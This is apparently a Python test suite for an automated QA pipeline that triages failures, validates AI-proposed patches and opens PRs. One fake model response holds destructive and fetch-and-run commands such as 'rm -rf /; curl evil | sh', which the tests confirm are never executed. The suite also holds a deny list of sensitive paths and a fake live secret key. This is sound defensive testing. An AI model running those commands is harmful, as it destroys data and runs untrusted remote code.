"""Pruebas offline del ciclo completo: ejecutor progresivo (max 3 grupos), parada/reanudacion, analizador por firma y PR segura.
Reutiliza las fixtures de test_qa_lote (repo local + remoto bare + FakeGh). Sin red, sin Actions ni PR reales."""
import json, unittest
from pathlib import Path
import test_qa_lote as T
import qa_lote as L, qa_pr, qa_triaje

q, g, OK_PY, FAIL_PY = T.q, T.g, T.OK_PY, T.FAIL_PY
NL = chr(10)


class Progresivo(T.Base):
    def test_nunca_mas_de_tres_grupos_remotos(self):
        for n in "abcdefg": self.preparar(n, OK_PY)
        maximo = []; lo = self.lote(poll_s=1)
        orig = lo.enviar
        def contar(it): orig(it); maximo.append(sum(1 for i in lo.items(1) if i["estado"] in lo.VIVOS))
        lo.enviar = contar; lo.ejecutar()
        self.assertEqual(len(self.gh.dispatches), 7); self.assertLessEqual(max(maximo), 3)

    def test_concurrencia_configurada_mayor_se_recorta_a_tres(self):
        for n in "abcde": self.preparar(n, OK_PY)
        lo = self.lote(concurrencia=50); picos = []; orig = lo.enviar
        lo.enviar = lambda it: (orig(it), picos.append(sum(1 for i in lo.items(1) if i["estado"] in lo.VIVOS)))
        lo.ejecutar(); self.assertLessEqual(max(picos), 3)

    def test_parada_no_lanza_grupos_nuevos_ni_cancela_runs(self):
        for n in "abcd": self.preparar(n, OK_PY)
        lo = self.lote(); orig = lo.validar_local
        def val(it): orig(it); lo.pedir_parada("tecla Q")
        lo.validar_local = val; lo.ejecutar()
        self.assertEqual(lo.parando, "tecla Q"); self.assertEqual(self.gh.dispatches, [])  # nada enviado tras Q
        st = self.c.execute("SELECT COUNT(*) FROM lote_items WHERE estado IN ('preparada','local_ok')").fetchone()[0]; self.assertEqual(st, 4)
        self.assertEqual(self.c.execute("SELECT estado FROM lotes").fetchone()[0], "en_curso")  # lote abierto: se reanuda
        self.lote().ejecutar(); self.assertEqual(len(self.gh.dispatches), 4)

    def test_parada_con_runs_vivos_los_deja_vivos_y_reanuda_sin_duplicar(self):
        rama, sha, _ = self.preparar("viv", OK_PY); lo = self.lote(); lo.abrir_lote(); it = lo.item(f"{rama}@{sha[:12]}")
        lo.validar_local(it); lo.enviar(lo.item(it["clave"])); n = len(self.gh.dispatches); lo.c.close()
        lo2 = self.lote(); lo2.pedir_parada("Ctrl+C")  # parada antes de empezar: solo reconcilia, no lanza
        lo2.ejecutar(); self.assertEqual(len(self.gh.dispatches), n)
        self.lote().ejecutar(); self.assertEqual(self.estado(rama), "actions_ok"); self.assertEqual(len(self.gh.dispatches), n)

    def test_fallos_se_encolan_para_analisis_sin_bloquear(self):
        self.preparar("reg", FAIL_PY, categoria="regresion"); self.preparar("ok", OK_PY)
        self.lote().ejecutar()
        self.assertEqual(self.c.execute("SELECT COUNT(*) FROM lote_items WHERE estado='actions_ok'").fetchone()[0], 1)
        j = self.c.execute("SELECT COUNT(*) FROM jobs WHERE tipo='T'").fetchone()[0]; self.assertGreaterEqual(j, 1)

    def test_conteo_y_panel_json(self):
        self.preparar("p", OK_PY); lo = self.lote(); lo.ejecutar()
        k = json.loads((lo.dir / "ejecutor.json").read_text()); self.assertEqual(k["aprobados"], 1); self.assertEqual(k["limite"], 3)
        self.assertEqual(k["grupos_remotos"], 0)


class Parche(unittest.TestCase):
    TEXTO = {"web/a.js": "const x = 1;\nconst y = 2;\n", "web/dup.js": "a\na\n"}
    leer = staticmethod(lambda r: Parche.TEXTO.get(r))

    def p(self, ruta="web/a.js", buscar="const x = 1;", por="const x = 3;"): return {"ficheros": [{"ruta": ruta, "reemplazos": [{"buscar": buscar, "por": por}]}]}

    def test_parche_valido(self):
        ok, pr, n = qa_pr.validar_parche(self.p(), self.leer); self.assertTrue(ok, pr); self.assertEqual(n["ficheros"][0]["ruta"], "web/a.js")

    def test_buscar_ausente_o_repetido_se_rechaza(self):
        self.assertFalse(qa_pr.validar_parche(self.p(buscar="nope"), self.leer)[0])
        self.assertFalse(qa_pr.validar_parche(self.p("web/dup.js", "a", "b"), self.leer)[0])

    def test_rutas_sensibles_y_traversal_se_rechazan(self):
        for r in (".github/workflows/x.yml", "scripts/qa-gpt/qa_lote.py", "package.json", "wrangler.toml", "../fuera.js", "/abs.js", "C:/x.js",
                  "src/stripe-checkout.js", "config/.env", "docs/secrets.js", ".ci/informe.md"):
            self.assertFalse(qa_pr.validar_parche(self.p(r), lambda _: "const x = 1;")[0], r)

    def test_secretos_en_el_reemplazo_se_rechazan(self):
        self.assertFalse(qa_pr.validar_parche(self.p(por="const k = 'sk_live_abcdef1234567890';"), self.leer)[0])

    def test_limites_de_ficheros_y_formato(self):
        seis = {"ficheros": [{"ruta": f"web/f{i}.js", "reemplazos": [{"buscar": "a", "por": "b"}]} for i in range(6)]}
        self.assertFalse(qa_pr.validar_parche(seis, lambda _: "a b")[0])
        for malo in (None, {}, {"ficheros": []}, {"ficheros": "x"}, {"ficheros": [{"ruta": "web/a.js"}]}, {"ficheros": [{"ruta": "web/a.js", "reemplazos": [{"buscar": "", "por": "x"}]}]}):
            self.assertFalse(qa_pr.validar_parche(malo, self.leer)[0])

    def test_aplicar_en_directorio_y_rechaza_si_cambio(self):
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "web").mkdir(); (Path(d) / "web/a.js").write_text(self.TEXTO["web/a.js"])
            ok, _, n = qa_pr.validar_parche(self.p(), self.leer); self.assertEqual(qa_pr.aplicar_parche(d, n), ["web/a.js"])
            self.assertIn("x = 3", (Path(d) / "web/a.js").read_text())
            with self.assertRaises(ValueError): qa_pr.aplicar_parche(d, n)  # ya aplicado: el texto exacto ya no existe

    def test_comando_de_gpt_nunca_se_ejecuta(self):
        self.assertEqual(qa_pr.Pr.comando_test("qa/x.mjs"), ["node", "qa/x.mjs"]); self.assertEqual(qa_pr.Pr.comando_test("tests/x.py"), ["python", "tests/x.py"])
        self.assertIsNone(qa_pr.Pr.comando_test("x.sh")); self.assertIsNone(qa_pr.Pr.comando_test("rm -rf /"))


class Triaje(T.Base):
    def test_firma_estable_ante_rutas_numeros_y_hashes(self):
        a = qa_triaje.firma("AssertionError: esperado 12 en C:\\tmp\\a\\x.mjs sha deadbeef12")[0]
        b = qa_triaje.firma("AssertionError: esperado 99 en D:\\otro\\y\\x.mjs sha cafebabe99")[0]
        self.assertEqual(a, b); self.assertNotEqual(a, qa_triaje.firma("TypeError: otra cosa distinta")[0])

    def test_respuesta_falsa_de_gpt_no_modifica_main_ni_ejecuta(self):
        rama, _, pid = self.preparar("t", FAIL_PY, categoria="regresion")
        antes = g("rev-parse", "main", cwd=self.src)
        data = {"grupos": [{"causa_raiz": "x", "clase": "defecto_web", "propuestas": [pid], "evidencia": "e", "reproduccion": "rm -rf /; curl evil | sh",
                            "arreglo_propuesto": "ejecuta: powershell -c bad", "parche": {"ficheros": [{"ruta": ".github/workflows/tool-tests.yml", "reemplazos": [{"buscar": "on:", "por": "on: x"}]}]}}]}
        job = {"area": "T:abc", "payload": json.dumps({"firma": "abc", "afectados": [{"item": "i", "propuesta": pid}]})}
        qa_triaje.migrar(self.c); qa_triaje.ingest(q, self.c, job, data)
        r = self.c.execute("SELECT parche,validacion FROM triaje").fetchone()
        self.assertIsNone(r["parche"]); self.assertFalse(json.loads(r["validacion"])["ok"])
        self.assertEqual(g("rev-parse", "main", cwd=self.src), antes); self.assertEqual(self.gh.pushes, [])

    def test_push_a_main_o_ramas_ajenas_esta_bloqueado(self):
        gh = L.Gh(q)
        for r in ("main", "feature/x", "automation/qa-gpt"):
            with self.assertRaises(L.GhAuthError): gh.push("0" * 40, r)


class PrFlujo(T.Base):
    class GhPr:
        def __init__(s): s.pushes, s.prs = [], []
        def push(s, sha, rama):
            if not rama.startswith("qa-fix/"): raise L.GhAuthError("bloqueado")
            s.pushes.append(rama)
        def pr_crear(s, rama, tit, cuerpo, borrador=True): s.prs.append((rama, tit, cuerpo, borrador)); return "https://github.com/x/y/pull/1"

    def montar(self, parche_buscar="VALOR = 1", aprobada=True):
        (self.src / "web").mkdir(exist_ok=True); (self.src / "web/a.py").write_text("VALOR = 1" + NL); g("add", "-A", cwd=self.src); g("commit", "-qm", "a", cwd=self.src); g("push", "-q", "origin", "main", cwd=self.src)
        test = NL.join(["import pathlib,sys", "sys.exit(0 if 'VALOR = 2' in pathlib.Path('web/a.py').read_text() else 1)", ""])
        rama, sha, pid = self.preparar("fx", test, categoria="regresion")
        norm = {"ficheros": [{"ruta": "web/a.py", "reemplazos": [{"buscar": parche_buscar, "por": "VALOR = 2"}]}]}
        qa_triaje.migrar(self.c)
        qa_triaje.guardar(self.c, q.now(), "g1", "VALOR mal", "defecto_web", [pid], [f"{rama}@{sha[:12]}"], "AssertionError", "python tests/test-fx.py", "cambiar VALOR", "gpt",
                          firma="abc123", parche=json.dumps(norm), analisis=json.dumps({"confianza": "alta"}), validacion="{}")
        if aprobada: self.c.execute("UPDATE triaje SET decision='corregir'"); self.c.commit()
        return self.c.execute("SELECT * FROM triaje").fetchone()

    def pr(self, gh): return qa_pr.Pr(q, gh, L.run_cmd, lambda *a: None)

    def test_pr_verde_se_abre_sin_borrador_y_main_queda_intacto(self):
        row = self.montar(); gh = self.GhPr(); antes = g("rev-parse", "origin/main", cwd=self.src)
        self.assertEqual(self.pr(gh).preparar(self.c, row), "pr_abierta")
        self.assertEqual(gh.pushes, ["qa-fix/abc123"]); rama, tit, cuerpo, borrador = gh.prs[0]; self.assertFalse(borrador)
        for sec in qa_pr.SECCIONES: self.assertIn(f"## {sec}", cuerpo)
        self.assertEqual(g("rev-parse", "origin/main", cwd=self.src), antes)
        self.assertEqual(self.c.execute("SELECT pr_estado FROM triaje").fetchone()[0], "pr_abierta")
        self.assertFalse((q.STATE / "pr" / "qa-fix_abc123").exists())  # worktree temporal limpiado

    def test_demo_siempre_borrador_y_marcada(self):
        row = self.montar(); gh = self.GhPr(); self.assertEqual(self.pr(gh).preparar(self.c, row, demo=True), "pr_borrador")
        self.assertTrue(gh.prs[0][3]); self.assertIn("NO FUSIONAR", gh.prs[0][2]); self.assertTrue(gh.prs[0][0].endswith("-demo"))

    def test_parche_que_ya_no_encaja_no_abre_pr(self):
        row = self.montar("VALOR = 7"); gh = self.GhPr()
        self.assertEqual(self.pr(gh).preparar(self.c, row), "parche_no_encaja"); self.assertEqual(gh.prs, [])

    def test_si_el_test_sigue_fallando_no_se_abre_pr_ni_borrador(self):
        row = self.montar(); self.c.execute("UPDATE triaje SET parche=?", (json.dumps({"ficheros": [{"ruta": "web/a.py", "reemplazos": [{"buscar": "VALOR = 1", "por": "VALOR = 3"}]}]}),)); self.c.commit()
        row = self.c.execute("SELECT * FROM triaje").fetchone(); gh = self.GhPr()
        self.assertEqual(self.pr(gh).preparar(self.c, row), "validacion_fallida"); self.assertEqual((gh.prs, gh.pushes), ([], []))
        self.assertEqual(self.c.execute("SELECT pr_estado FROM triaje").fetchone()[0], "validacion_fallida")

    def test_sin_aprobacion_de_claude_no_hay_pr_ni_candidata(self):
        row = self.montar(aprobada=False); gh = self.GhPr()
        self.assertEqual(self.pr(gh).candidatas(self.c), [])
        self.assertEqual(self.pr(gh).preparar(self.c, row), "sin_aprobacion"); self.assertEqual(gh.prs, [])

    def test_si_el_test_ya_pasa_en_main_no_reproduce_y_no_hay_pr(self):
        row = self.montar(); self.c.execute("UPDATE triaje SET parche=?", (json.dumps({"ficheros": [{"ruta": "web/a.py", "reemplazos": [{"buscar": "VALOR = 1", "por": "VALOR = 2"}]}]}),))
        (self.src / "web/a.py").write_text("VALOR = 2" + NL); g("add", "-A", cwd=self.src); g("commit", "-qm", "ya arreglado", cwd=self.src); g("push", "-q", "origin", "main", cwd=self.src)
        row = self.c.execute("SELECT * FROM triaje").fetchone(); gh = self.GhPr()
        self.assertEqual(self.pr(gh).preparar(self.c, row), "no_reproduce"); self.assertEqual(gh.prs, [])

    def test_baseline_con_timeout_sin_asercion_no_demuestra_el_defecto(self):
        row = self.montar(); gh = self.GhPr(); p = self.pr(gh); p._test = lambda wt, t: (1, "page.waitForFunction: TimeoutError: 30000ms")
        self.assertEqual(p.preparar(self.c, row), "test_no_fiable"); self.assertEqual(gh.prs, [])

    def test_reanudacion_con_pr_ya_existente_la_vincula_sin_duplicar(self):
        row = self.montar(); gh = self.GhPr(); gh.pr_de_rama = lambda rama: {"number": 77, "url": "https://github.com/x/y/pull/77", "headRefOid": "abc"}
        self.assertEqual(self.pr(gh).preparar(self.c, row), "pr_abierta"); self.assertEqual(gh.prs, []); self.assertEqual(gh.pushes, [])
        r = self.c.execute("SELECT pr_numero,pr_nueva,pr_estado FROM triaje").fetchone(); self.assertEqual(tuple(r), (77, 1, "pr_abierta"))

    def test_parada_durante_la_validacion_no_marca_fallo_ni_abre_pr(self):
        row = self.montar(); gh = self.GhPr(); p = self.pr(gh); p.run = lambda *a, **k: (_ for _ in ()).throw(qa_pr.Interrumpido())
        self.assertEqual(p.preparar(self.c, row), "interrumpida"); self.assertEqual(gh.prs, [])
        self.assertIsNone(self.c.execute("SELECT pr_estado FROM triaje").fetchone()[0])

    def test_pr_nueva_guarda_numero_y_marca_de_flujo(self):
        row = self.montar(); self.pr(self.GhPr()).preparar(self.c, row)
        r = self.c.execute("SELECT pr_numero,pr_nueva,pr_head FROM triaje").fetchone(); self.assertEqual((r[0], r[1]), (1, 1)); self.assertTrue(r[2])

    class GhCiclo(GhPr):
        def __init__(s, abiertas=(), ci="verde"): super().__init__(); s.abiertas, s.ci, s.merges = list(abiertas), ci, []
        def prs_abiertas(s): return s.abiertas + [{"number": 1, "headRefName": r, "files": [{"path": "web/a.py"}]} for r, *_ in s.prs]
        detras = (0, [])
        def pr_ver(s, n): return {"state": "OPEN", "isDraft": False, "mergeable": "MERGEABLE", "mergeStateStatus": "CLEAN", "headRefOid": "abc", "files": [{"path": "web/a.py"}],
                                  "statusCheckRollup": [{"status": "COMPLETED", "conclusion": "SUCCESS" if s.ci == "verde" else "FAILURE"}]}
        def main_desde(s, sha): return s.detras
        def pr_diff(s, n): return "diff --git a/web/a.py b/web/a.py\n-VALOR = 1\n+VALOR = 2\n"
        def pr_merge(s, n, sha): s.merges.append((n, sha))

    def ciclo(self, gh, **flujo):
        import qa_claude
        q.CFG["flujo"] = {"max_pr_activas": 1, **flujo}; self.addCleanup(q.CFG.pop, "flujo", None)
        for mod, nom in ((qa_triaje, "decidir_pendientes"), (qa_claude, "llamar")): self.addCleanup(setattr, mod, nom, getattr(mod, nom))
        qa_triaje.decidir_pendientes = lambda *a, **k: 0  # sin llamar a Claude real
        qa_claude.llamar =lambda *a, **k: ({"veredicto": "integrar", "riesgo": "bajo", "cumple_criterio": True, "motivos": ["ok"]}, {})
        return qa_pr.Ciclo(q, gh, L.run_cmd, lambda *a: None)

    def test_ciclo_respeta_presupuesto_cero(self):
        self.montar(); gh = self.GhCiclo(); self.ciclo(gh, max_pr_activas=0).paso(self.c); self.assertEqual(gh.prs, [])

    def test_ciclo_no_solapa_con_pr_nueva_del_flujo_sobre_los_mismos_archivos(self):
        self.montar(); gh = self.GhCiclo([{"number": 9, "headRefName": "otra", "files": [{"path": "web/a.py"}]}])
        self.c.execute("INSERT INTO triaje (id,causa_raiz,clase,pr_estado,pr_numero,pr_nueva) VALUES (900,'x','defecto_web','pr_abierta',9,1)"); self.c.commit()
        r = self.ciclo(gh, max_pr_activas=3).paso(self.c); self.assertEqual(gh.prs, []); self.assertEqual(r["solapadas"], 1)

    def test_ciclo_solape_con_pr_heredada_no_bloquea(self):
        self.montar(); gh = self.GhCiclo([{"number": 9, "headRefName": "vieja", "files": [{"path": "web/a.py"}]}])
        r = self.ciclo(gh).paso(self.c); self.assertEqual(len(gh.prs), 1); self.assertNotIn("solapadas", r)

    def test_ciclo_abre_pr_revisa_y_solo_recomienda_en_modo_recomendacion(self):
        self.montar(); gh = self.GhCiclo(); ci = self.ciclo(gh, integracion={"modo": "recomendacion", "calibracion_min": 10}); ci.paso(self.c); r = ci.paso(self.c)
        self.assertEqual(len(gh.prs), 1); row = self.c.execute("SELECT integracion,revision_hash FROM triaje").fetchone()
        self.assertEqual((row[0], row[1]), ("recomendada", "abc")); self.assertEqual(gh.merges, [])
        ci.paso(self.c); self.assertEqual(self.c.execute("SELECT COUNT(*) FROM claude_llamadas").fetchone()[0], 0)  # revision cacheada por commit: no se repite

    def test_modo_lote_valida_sin_abrir_pr_y_agrupa_cuando_no_hay_mas_trabajo(self):
        self.montar(); gh = self.GhCiclo(); ci = self.ciclo(gh, modo_pr="lote", integracion={"modo": "recomendacion", "calibracion_min": 10})
        r = ci.paso(self.c)
        self.assertEqual(len(gh.prs), 1); rama, tit, cuerpo, borrador = gh.prs[0]
        self.assertTrue(rama.startswith("qa-fix/lote-")); self.assertIn("Lote de 1", cuerpo); self.assertFalse(borrador)
        self.assertEqual(r.get("lote_correcciones"), 1)
        row = self.c.execute("SELECT pr_estado,pr_numero,pr_nueva FROM triaje").fetchone(); self.assertEqual(tuple(row), ("pr_abierta", 1, 1))

    def test_modo_lote_espera_si_hay_menos_del_minimo_y_queda_trabajo(self):
        self.montar(); gh = self.GhCiclo(); ci = self.ciclo(gh, modo_pr="lote", lote={"min": 3})
        self.c.execute("INSERT INTO triaje (id,causa_raiz,clase,decision,pr_estado) VALUES (901,'otra','defecto_web','corregir','esperando_desarrollo')"); self.c.commit()
        ci.paso(self.c)
        self.assertEqual(gh.prs, []); self.assertEqual(self.c.execute("SELECT pr_estado FROM triaje WHERE id!=901").fetchone()[0], "listo_lote")

    def test_ci_rojo_no_se_revisa_ni_se_integra(self):
        self.montar(); gh = self.GhCiclo(ci="rojo"); ci = self.ciclo(gh); ci.paso(self.c); ci.paso(self.c)
        self.assertEqual(self.c.execute("SELECT integracion FROM triaje").fetchone()[0], "ci_rojo"); self.assertEqual(gh.merges, [])

    def test_modo_auto_no_integra_sin_calibracion(self):
        self.montar(); gh = self.GhCiclo(); ci = self.ciclo(gh, integracion={"modo": "auto", "calibracion_min": 10}); ci.paso(self.c); ci.paso(self.c)
        self.assertEqual(gh.merges, [])

    def test_modo_auto_sin_calibracion_integra_atado_al_sha_revisado(self):
        self.montar(); gh = self.GhCiclo(); ci = self.ciclo(gh, integracion={"modo": "auto", "calibracion_min": 0}); ci.paso(self.c); ci.paso(self.c)
        self.assertEqual(gh.merges, [(1, "abc")])

    def test_modo_auto_actualiza_rama_si_va_por_detras(self):
        self.montar(); gh = self.GhCiclo(); gh.actualizadas = []; gh.pr_actualizar = lambda n: gh.actualizadas.append(n)
        pv = gh.pr_ver; gh.pr_ver = lambda n: {**pv(n), "mergeStateStatus": "BEHIND"}
        ci = self.ciclo(gh, integracion={"modo": "auto", "calibracion_min": 0}); ci.paso(self.c); ci.paso(self.c)
        self.assertEqual(gh.merges, []); self.assertEqual(set(gh.actualizadas), {1})  # reintenta en cada ciclo mientras siga BEHIND

    def test_sin_strict_por_detras_se_fusiona_si_main_no_toca_lo_suyo(self):
        self.montar(); gh = self.GhCiclo(); gh.actualizadas = []; gh.pr_actualizar = lambda n: gh.actualizadas.append(n)
        gh.detras = (3, ["libros/otro.html", "pagefind/x.pf_fragment"])
        ci = self.ciclo(gh, integracion={"modo": "auto", "calibracion_min": 0}); ci.paso(self.c); ci.paso(self.c)
        self.assertEqual(gh.merges, [(1, "abc")]); self.assertEqual(gh.actualizadas, [])

    def test_sin_strict_main_toca_sus_ficheros_o_infra_compartida_actualiza(self):
        gh = self.GhCiclo(); ci = self.ciclo(gh); v = gh.pr_ver(1)
        for detras in ((2, ["web/a.py"]), (1, ["package.json"]), (1, ["tests/_helpers.py"]), (1, [".github/workflows/x.yml"]), (60, ["x.html"]), (1, ["f"] * 300)):
            with self.subTest(detras=detras[1][:1]):
                gh.detras = detras; self.assertTrue(ci._main_arriesgado(v, "abc"))
        gh.main_desde = lambda sha: (_ for _ in ()).throw(RuntimeError("api"))
        self.assertTrue(ci._main_arriesgado(v, "abc"))  # sin comparacion: ante la duda, actualizar
        self.assertTrue(ci._main_arriesgado({**v, "files": []}, "abc"))

    def test_recomendada_ya_revisada_se_integra_al_cambiar_a_auto(self):
        self.montar(); gh = self.GhCiclo(); ci = self.ciclo(gh, integracion={"modo": "recomendacion"}); ci.paso(self.c); ci.paso(self.c)
        self.assertEqual(gh.merges, [])
        q.CFG["flujo"]["integracion"] = {"modo": "auto", "calibracion_min": 0}; ci.paso(self.c)
        self.assertEqual(gh.merges, [(1, "abc")])

    def test_desarrollo_se_encola_una_vez_por_intento_y_con_tope(self):
        row = self.montar(); qa_triaje.migrar(self.c)
        self.c.execute("UPDATE triaje SET decision_json=? ", (json.dumps({"criterio_aceptacion": "VALOR es 2", "archivos": ["web/a.py"]}),)); self.c.commit()
        row = self.c.execute("SELECT * FROM triaje").fetchone()
        self.assertTrue(qa_triaje.encolar_desarrollo(q, self.c, row, "fallo X"))
        row = self.c.execute("SELECT * FROM triaje").fetchone(); self.assertEqual(row["intentos_dev"], 1)
        self.assertTrue(qa_triaje.encolar_desarrollo(q, self.c, row, "fallo Y"))
        row = self.c.execute("SELECT * FROM triaje").fetchone(); self.assertFalse(qa_triaje.encolar_desarrollo(q, self.c, row, "fallo Z"))  # tope max_intentos=2
        no_aprobada = dict(row); no_aprobada["decision"] = "rechazar"; self.assertFalse(qa_triaje.encolar_desarrollo(q, self.c, no_aprobada))

    def test_decision_incoherente_no_aprueba(self):
        d = {"id": 1, "decision": "corregir", "prioridad": 2, "causa_probable": "x", "justificacion": "y", "confianza": "alta", "archivos": ["a"]}
        self.assertIsNotNone(qa_triaje.decision_valida(d))  # sin criterio de aceptacion
        self.assertIsNone(qa_triaje.decision_valida({**d, "criterio_aceptacion": "c"}))
        self.assertIsNotNone(qa_triaje.decision_valida({**d, "criterio_aceptacion": "c", "confianza": "baja"}))
        self.assertIsNotNone(qa_triaje.decision_valida({**d, "decision": "duplicado"}))

    def test_esquema_rechaza_respuesta_invalida(self):
        import qa_claude
        self.assertTrue(qa_claude.validar({"decisiones": [{"id": 1, "decision": "inventada"}]}, qa_triaje.ESQUEMA_DECISION))
        self.assertTrue(qa_claude.validar({}, qa_triaje.ESQUEMA_DECISION))

    def test_ci_estado(self):
        self.assertEqual(qa_pr.ci_estado([{"status": "COMPLETED", "conclusion": "SUCCESS"}]), "verde")
        self.assertEqual(qa_pr.ci_estado([{"status": "COMPLETED", "conclusion": "SUCCESS"}, {"status": "IN_PROGRESS"}]), "pendiente")
        self.assertEqual(qa_pr.ci_estado([{"status": "COMPLETED", "conclusion": "FAILURE"}, {"status": "IN_PROGRESS"}]), "rojo")
        self.assertEqual(qa_pr.ci_estado([]), "pendiente")

    def test_ci_estado_ignora_no_requeridos_pendientes(self):
        req = ("A", "B")
        ok = lambda n: {"name": n, "status": "COMPLETED", "conclusion": "SUCCESS"}
        lento = {"name": "lento", "status": "IN_PROGRESS"}
        self.assertEqual(qa_pr.ci_estado([ok("A"), ok("B"), lento], req), "verde")
        self.assertEqual(qa_pr.ci_estado([ok("A"), lento], req), "pendiente")  # falta un requerido
        self.assertEqual(qa_pr.ci_estado([ok("A"), {"name": "B", "status": "IN_PROGRESS"}], req), "pendiente")
        self.assertEqual(qa_pr.ci_estado([ok("A"), ok("B"), {"name": "lento", "status": "COMPLETED", "conclusion": "FAILURE"}], req), "rojo")
        self.assertEqual(qa_pr.ci_estado([ok("A"), ok("B"), lento]), "pendiente")

    def test_una_causa_con_pr_no_se_repite(self):
        row = self.montar(); self.pr(self.GhPr()).preparar(self.c, row)
        self.assertEqual(self.pr(self.GhPr()).candidatas(self.c), [])

    def test_misma_causa_con_pr_se_vincula_sin_tocar_su_rama(self):
        row = self.montar(); gh = self.GhPr(); self.assertEqual(self.pr(gh).preparar(self.c, row), "pr_abierta")
        self.c.execute("INSERT INTO triaje (grupo,causa_raiz,clase,propuestas,items,evidencia,reproduccion,arreglo,estado,fuente,creado,actualizado,firma,parche) "
                       "SELECT grupo||'-bis',causa_raiz,clase,propuestas,items,evidencia,reproduccion,arreglo,estado,fuente,creado,actualizado,firma,parche FROM triaje"); self.c.commit()
        dup = self.c.execute("SELECT * FROM triaje WHERE pr_estado IS NULL").fetchone(); gh2 = self.GhPr()
        self.assertEqual(self.pr(gh2).preparar(self.c, dup), "duplicada"); self.assertEqual(gh2.prs, [])
        self.assertEqual(self.c.execute("SELECT pr_url FROM triaje WHERE id=?", (dup["id"],)).fetchone()[0], self.c.execute("SELECT pr_url FROM triaje WHERE id=?", (row["id"],)).fetchone()[0])

    def test_verificadores_segun_ficheros_tocados(self):
        import tempfile, qa_pr
        with tempfile.TemporaryDirectory() as d:
            for n in ("check-asset-versions.py", "build-pagefind-index.py", "build-site-shell.py"):
                (Path(d) / "scripts").mkdir(exist_ok=True); (Path(d) / "scripts" / n).write_text("")
            nombres = lambda t: [c[1].split("/")[-1] for c in qa_pr.verificadores(d, t)]
            self.assertEqual(nombres(["qa/x.mjs"]), [])
            self.assertIn("check-asset-versions.py", nombres(["script.js"]))
            self.assertIn("build-pagefind-index.py", nombres(["libros/a.html"]))
            self.assertNotIn("check-asset-versions.py", nombres(["libros/a.html"]))

    def test_reproduce_en_main_antes_de_gastar_desarrollo(self):
        row = self.montar(); p = self.pr(self.GhPr())
        self.assertIs(p.reproduce(self.c, row), True)  # VALOR = 1 en main: el test falla, el defecto existe
        (self.src / "web/a.py").write_text("VALOR = 2" + NL); g("commit", "-qam", "otro lote lo arregla", cwd=self.src); g("push", "-q", "origin", "main", cwd=self.src)
        self.assertIs(p.reproduce(self.c, row), False)
        self.c.execute("UPDATE triaje SET parche=NULL"); self.c.commit()
        gh = self.GhCiclo(); r = self.ciclo(gh).paso(self.c)
        self.assertEqual(self.c.execute("SELECT pr_estado FROM triaje").fetchone()[0], "no_reproduce"); self.assertEqual(r.get("no_reproducen"), 1)
        self.assertFalse(list((Path(q.STATE) / "pr").glob("repro_*")))  # sin worktrees huerfanos

    def test_regenerar_sube_solo_el_asset_tocado_y_rehace_lo_obsoleto(self):
        import tempfile, qa_pr
        with tempfile.TemporaryDirectory() as d:
            (Path(d) / "scripts").mkdir()
            for n in ("bump-asset-version.py", "build-pagefind-index.py", "build-site-shell.py", "build-books.py"): (Path(d) / "scripts" / n).write_text("")
            (Path(d) / "scripts" / "check-asset-versions.py").write_text('TRACKED_ASSETS = {\n    "a.js": "7",\n    "shell.js": "24",\n    "b.css": "3",\n    "ajeno.css": "2",\n}\n', encoding="utf-8")
            hechos = []
            def run(cmd, cwd, timeout=0, env=None):
                hechos.append(" ".join(cmd[1:]))
                if cmd[:3] == ["git", "diff", "--name-only"]: return 0, "assets/a.js\nassets/shell.js\nassets/b.css\nassets/libre.js\nlibros/x.html\n"  # shell.js: lo reescribio el generador
                if cmd[:2] == ["git", "diff"]: return 0, '-    "b.css": "3",\n+    "b.css": "4",\n'  # el parche ya subio b.css
                if cmd[-1] == "--check": return (1, "stale") if "pagefind" in cmd[1] or "books" in cmd[1] else (0, "")
                return 0, ""
            self.assertEqual(qa_pr.regenerar(run, d, ["qa/x.mjs"]), [])
            self.assertEqual(qa_pr.regenerar(run, d, ["assets/a.js", "scripts/build-books.py"]), ["build-books.py", "?v= a.js", "?v= shell.js", "build-pagefind-index.py"])
            self.assertLess(hechos.index("scripts/build-books.py"), hechos.index("scripts/bump-asset-version.py a.js 8"))  # generador antes del bump
            self.assertIn("scripts/bump-asset-version.py shell.js 25", hechos)
            self.assertFalse(any("ajeno" in h or "b.css" in h or "libre" in h for h in hechos if "bump" in h))  # deuda ajena, ya subido o no rastreado: no se toca
            self.assertNotIn("scripts/build-site-shell.py", hechos)  # al dia: no se reescribe
        self.assertEqual([qa_pr.siguiente_version(v) for v in ("7", "202610-launch-31", "x")], ["8", "202610-launch-32", "x-1"])


class Perdidas(T.Base):
    def test_reparar_perdidas_devuelve_a_aceptada_solo_la_que_perdio_su_fichero(self):
        r1, sha1, p1 = self.preparar("pierde", OK_PY); r2, sha2, p2 = self.preparar("intacta", OK_PY)
        g("checkout", "-q", r1, cwd=self.src); g("rm", "-q", "tests/test-pierde.py", cwd=self.src); g("commit", "-qm", "rollback", cwd=self.src)
        nuevo = g("rev-parse", "HEAD", cwd=self.src); g("checkout", "-q", "main", cwd=self.src)
        self.c.execute("UPDATE ramas SET sha=? WHERE rama=?", (nuevo, r1)); self.c.commit()
        self.assertEqual(q.reparar_perdidas(self.c), 1)
        self.assertEqual((self.prop(p1), self.prop(p2)), ("aceptada", "preparada"))
        self.assertEqual(q.reparar_perdidas(self.c), 0)  # idempotente


class CuerpoPr(unittest.TestCase):
    def test_cuerpo_usa_expediente_aprobado_sin_campos_vacios(self):
        import sqlite3, tempfile
        c = sqlite3.connect(":memory:"); c.row_factory = sqlite3.Row
        c.execute("CREATE TABLE triaje (id, causa_raiz, clase, analisis, validacion, evidencia, arreglo, decision_json)")
        dj = json.dumps({"decision": "corregir", "prioridad": 2, "confianza": "alta", "causa_probable": "CAUSA-X", "justificacion": "JUST-X",
                         "criterio_aceptacion": "CRIT-X", "archivos": ["a.py"]})
        c.execute("INSERT INTO triaje VALUES (6,'resumen','defecto_web',NULL,?, 'ev','',?)", (json.dumps({"explicacion": "EXPL-X"}), dj))
        cuerpo = qa_pr.cuerpo_pr(c.execute("SELECT * FROM triaje").fetchone(), ["t.py"], "VERIF")
        for x in ("CAUSA-X", "JUST-X", "CRIT-X", "EXPL-X", "VERIF", "`a.py`"): self.assertIn(x, cuerpo)
        for malo in ("(no indicado)", "None", "firma"): self.assertNotIn(malo, cuerpo)

    def test_relacionados_incluye_citados_y_hermanos(self):
        import tempfile
        with tempfile.TemporaryDirectory() as d:
            wt = Path(d); (wt / "tests").mkdir()
            for n in ("test_modulo_x.py", "test_otro.py", "test_ya.py"): (wt / "tests" / n).write_text("")
